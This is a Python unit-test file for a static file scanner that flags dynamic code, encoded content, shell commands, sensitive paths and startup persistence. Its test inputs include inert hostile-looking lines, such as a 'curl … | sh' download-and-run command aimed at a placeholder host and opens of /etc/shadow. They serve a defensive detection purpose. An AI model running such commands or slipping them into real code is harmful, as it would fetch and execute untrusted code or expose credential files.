"""Harmless functional tests. Run: python3 -m unittest -v"""
import contextlib
import hashlib
import io
import os
from pathlib import Path
import tempfile
import unittest

import falcon_check as scanner


class ScannerTests(unittest.TestCase):
    def test_python_comments_docstrings_and_strings_are_not_calls(self):
        source = b'"""eval(x) /etc/shadow crontab"""\n# exec(x)\ns = "eval(x)"\n'
        self.assertEqual(scanner.analyze_bytes(source, "example.py")["findings"], [])
        self.assertEqual(scanner.analyze_bytes(source, "example.txt")["status"], "NEEDS REVIEW")

    def test_python_direct_call_and_line(self):
        result = scanner.analyze_bytes(b'# eval(x)\neval("2 + 2")\n', "example.py")
        self.assertEqual([(f["rule"], f["line"]) for f in result["findings"]], [("dynamic-code", 2)])

    def test_python_multiline_call(self):
        result = scanner.analyze_bytes(b'exec(\n "pass"\n)\n', "example.py")
        self.assertEqual(result["findings"][0]["rule"], "dynamic-code")

    def test_import_aliases(self):
        source = b'import builtins as b\nfrom base64 import b64decode as decode\nb.eval("2")\ndecode("QQ==")\n'
        result = scanner.analyze_bytes(source, "example.py")
        self.assertEqual({f["rule"] for f in result["findings"]}, {"dynamic-code", "encoded-content"})

    def test_literal_sensitive_path_requires_selected_call_context(self):
        source = b's = "/etc/shadow"\nprint("/etc/shadow")\nopen("/etc/shadow")\n'
        result = scanner.analyze_bytes(source, "example.py")
        self.assertEqual([(f["rule"], f["line"]) for f in result["findings"]], [("sensitive-path", 3)])

    def test_pathlib_alias(self):
        source = b'from pathlib import Path as P\nP("/home/demo/.ssh/example")\n'
        self.assertEqual(scanner.analyze_bytes(source, "example.py")["findings"][0]["rule"], "sensitive-path")

    def test_subprocess_shell_true_and_false(self):
        for flag in (True, False):
            source = ('import subprocess\nsubprocess.run("echo hello", shell=%s)\n' % flag).encode()
            result = scanner.analyze_bytes(source, "example.py")
            self.assertEqual(bool(result["findings"]), flag)

    def test_subprocess_argument_list(self):
        source = b'import subprocess\nsubprocess.run(["crontab", "-l"])\n'
        self.assertIn("startup", [f["rule"] for f in scanner.analyze_bytes(source, "example.py")["findings"]])

    def test_literal_download_command(self):
        # Inert source text only; the scanner must never run it.
        source = b'import os\nos.system("curl https://example.invalid/demo | sh")\n'
        self.assertEqual({f["rule"] for f in scanner.analyze_bytes(source, "example.py")["findings"]},
                         {"shell-command", "download-shell"})

    def test_invalid_python_is_not_inspected(self):
        result = scanner.analyze_bytes(b'eval(\n', "example.py")
        self.assertEqual(result["status"], "NOT INSPECTED")

    def test_python_limits(self):
        for source in (b'#' + b'x' * scanner.MAX_PYTHON_BYTES, b'x=1\n' * 26000):
            self.assertEqual(scanner.analyze_bytes(source, "example.py")["status"], "NOT INSPECTED")

    def test_explicit_mode(self):
        source = b'# eval(x)\n'
        self.assertEqual(scanner.analyze_bytes(source, "file.txt", "python")["findings"], [])
        self.assertEqual(scanner.analyze_bytes(source, "file.py", "text")["status"], "NEEDS REVIEW")

    def test_own_source_has_no_selected_syntax_indicators(self):
        result = scanner.scan_file(Path(scanner.__file__))
        self.assertEqual(result["status"], "NO INDICATORS FOUND")

    def test_variable_path_is_now_traced(self):
        source = b'p = "/etc/shadow"\nopen(p)\n'
        self.assertEqual(scanner.analyze_bytes(source, "example.py")["findings"][0]["rule"], "sensitive-path")

    def test_ordinary_text(self):
        result = scanner.analyze_bytes(scanner.DEMO_ORDINARY, "example.txt")
        self.assertEqual(result["status"], "NO INDICATORS FOUND")
        self.assertEqual(result["sha256"], hashlib.sha256(scanner.DEMO_ORDINARY).hexdigest())

    def test_demo_has_expected_findings_and_lines(self):
        result = scanner.analyze_bytes(scanner.DEMO_REVIEW, "example.txt")
        self.assertEqual(result["status"], "NEEDS REVIEW")
        self.assertEqual({f["rule"]: f["line"] for f in result["findings"]},
                         {"dynamic-code": 2, "sensitive-path": 3, "startup": 4})

    def test_every_rule_with_inert_text(self):
        examples = {"download-shell": "curl https://example.invalid/demo | sh",
                    "dynamic-code": "eval(x)", "encoded-content": "b64decode(x)",
                    "shell-command": "shell=True", "sensitive-path": ".ssh/example",
                    "startup": ".config/autostart", "powershell-encoded": "powershell -enc PLACEHOLDER"}
        for key, example in examples.items():
            with self.subTest(rule=key):
                result = scanner.analyze_bytes(example.encode(), "inert.txt")
                self.assertIn(key, [f["rule"] for f in result["findings"]])

    def test_unsupported_content_is_not_a_negative_result(self):
        for data in [b"\x7fELFabc", b"MZabc", b"PK\x03\x04", b"%PDF-1.7",
                     b"\xff\xfe", b"abc\x00def"]:
            with self.subTest(prefix=data[:8]):
                self.assertNotIn(scanner.analyze_bytes(data, "test")["status"], ("NO INDICATORS FOUND", "NO THREATS REPORTED"))

    def test_terminal_controls_are_escaped(self):
        result = scanner.analyze_bytes(b"eval(x)", "\x1b[31mfake.txt")
        stream = io.StringIO()
        with contextlib.redirect_stdout(stream):
            scanner.show_report(result)
        self.assertNotIn("\x1b", stream.getvalue())

    def test_file_is_read_not_executed_or_changed(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "sample.py"
            payload = b'raise RuntimeError("must never execute")\n'
            path.write_bytes(payload)
            scanner.scan_file(path)
            self.assertEqual(path.read_bytes(), payload)

    def test_directory_missing_file_symlink_fifo_and_size(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            with self.assertRaises((OSError, ValueError)):
                scanner.scan_file(root)
            with self.assertRaises(OSError):
                scanner.scan_file(root / "missing")
            file = root / "file.txt"
            file.write_text("Hello")
            link = root / "link"
            link.symlink_to(file)
            if hasattr(os, "O_NOFOLLOW"):
                with self.assertRaises(OSError):
                    scanner.scan_file(link)
            if hasattr(os, "mkfifo"):
                fifo = root / "pipe"
                os.mkfifo(fifo)
                with self.assertRaises(ValueError):
                    scanner.scan_file(fifo)
            file.write_bytes(b"x" * (3 * 1024 * 1024))
            result = scanner.scan_file(file)
            self.assertEqual(result["status"], "NO INDICATORS FOUND")
            self.assertIsNotNone(result["sha256"])


if __name__ == "__main__":
    unittest.main()
